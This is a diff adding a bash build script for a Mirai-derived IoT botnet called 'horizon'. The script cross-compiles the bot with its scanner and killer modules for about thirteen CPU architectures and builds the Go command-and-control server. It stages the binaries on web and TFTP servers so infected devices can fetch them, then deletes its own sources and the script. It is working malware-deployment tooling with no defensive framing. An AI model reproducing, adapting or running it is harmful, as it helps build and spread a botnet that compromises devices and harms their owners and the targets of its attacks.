@@ -1,0 +1,77 @@
+#!/bin/bash
+export PATH=$PATH:/etc/xcompile/arc/bin
+export PATH=$PATH:/etc/xcompile/armv4l/bin
+export PATH=$PATH:/etc/xcompile/armv5l/bin
+export PATH=$PATH:/etc/xcompile/armv6l/bin
+export PATH=$PATH:/etc/xcompile/armv7l/bin
+export PATH=$PATH:/etc/xcompile/i586/bin
+export PATH=$PATH:/etc/xcompile/i686/bin
+export PATH=$PATH:/etc/xcompile/m68k/bin
+export PATH=$PATH:/etc/xcompile/mips/bin
+export PATH=$PATH:/etc/xcompile/mipsel/bin
+export PATH=$PATH:/etc/xcompile/powerpc/bin
+export PATH=$PATH:/etc/xcompile/sh4/bin
+export PATH=$PATH:/etc/xcompile/sparc/bin
+
+export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
+
+function compile_bot {
+    "$1-gcc" $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
+    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
+}
+
+function compile_bot_arm7 {
+    "$1-gcc" $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
+}
+
+function arc_compile {
+    "$1-linux-gcc" -DMIRAI_BOT_ARCH="$3" -std=c99 bot/*.c -s -o release/"$2"
+}
+
+rm -rf ~/release
+mkdir ~/release
+rm -rf /var/www/html
+rm -rf /var/lib/tftpboot
+mkdir /var/www/html
+mkdir /var/www/html/bins
+mkdir /var/lib/tftpboot
+
+go build -o bot/cnc cnc/*.go
+rm -rf ~/cnc
+mv ~/bot/cnc ~/
+
+arc_compile arc horizon.arc "-static -DSCANNERINIT"
+compile_bot i586 horizon.x86 "-static -DSCANNERINIT"
+compile_bot i686 horizon.i686 "-static -DSCANNERINIT"
+compile_bot mips horizon.mips "-static -DSCANNERINIT"
+compile_bot mipsel horizon.mpsl "-static -DSCANNERINIT"
+compile_bot armv4l horizon.arm "-static -DSCANNERINIT"
+compile_bot armv5l horizon.arm5 "-DSCANNERINIT"
+compile_bot armv6l horizon.arm6 "-static -DSCANNERINIT"
+compile_bot_arm7 armv7l horizon.arm7 "-static -DSCANNERINIT"
+compile_bot powerpc horizon.ppc "-static -DSCANNERINIT"
+compile_bot sparc horizon.spc "-static -DSCANNERINIT"
+compile_bot m68k horizon.m68k "-static -DSCANNERINIT"
+compile_bot sh4 horizon.sh4 "-static -DSCANNERINIT"
+compile_bot i586 horizon.kill "-static  -DSCANNERINIT -DKILLERINIT"
+
+compile_bot i586 a.x86 "-static -DKILLERINIT"
+compile_bot i686 a.i686 "-static -DKILLERINIT"
+compile_bot mipsel a.mpsl "-static -DKILLERINIT"
+compile_bot armv4l a.arm "-static -DKILLERINIT"
+compile_bot armv5l a.arm5 "-DKILLERINIT"
+compile_bot_arm7 armv7l a.arm7 "-static -DKILLERINIT"
+
+cp release/horizon.* /var/lib/tftpboot
+mv release/horizon.* /var/www/html/bins
+mv release/a.* /var/www/html/bins
+
+compile_bot i586 a.out "-static -DDEBUG"
+
+mv release/* /root/
+
+echo "skrrrr" > /var/www/html/index.html
+
+rm -rf release
+
+rm -rf ~/bot ~/Projects ~/build.sh
